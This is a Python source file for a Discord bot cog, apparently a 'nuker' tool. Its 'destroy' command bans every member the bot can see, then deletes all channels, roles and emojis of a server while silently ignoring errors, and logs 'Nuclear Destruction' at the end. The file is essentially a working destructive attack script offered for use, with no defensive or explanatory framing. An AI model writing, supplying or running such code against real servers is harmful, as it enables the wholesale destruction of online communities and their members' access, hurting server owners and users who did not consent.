import discord, time, asyncio, json
from discord.ext import commands
from discord.ext.commands import Cog
from discord.ext.commands.core import command

with open('./config.json') as f:
    config = json.load(f)

NEW_CHANNEL_TEXT = config.get('NEW_CHANNEL_TEXT')

class destroy(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    #DESTROY COMMAND
    @commands.command(pass_context=True)
    async def destroy(self, ctx):
        await ctx.message.delete()
        for member in list(self.bot.get_all_members()):
            try:
                await member.ban()
                print("User " + member.name + " has been banned")
            except:
                pass
        for channel in list(ctx.message.guild.channels):
            try:
                await channel.delete()
                print(channel.name + " has been deleted")
            except:
                pass
            guild = ctx.message.guild
            channel = await guild.create_text_channel(NEW_CHANNEL_TEXT)
            print('new channel has created.')
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print(f"{role.name} has been deleted")
            except:
                pass
        for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print(f"{emoji.name} has been deleted")
            except:
                pass
        print("Action completed: Nuclear Destruction")


def setup(bot):
    bot.add_cog(destroy(bot))
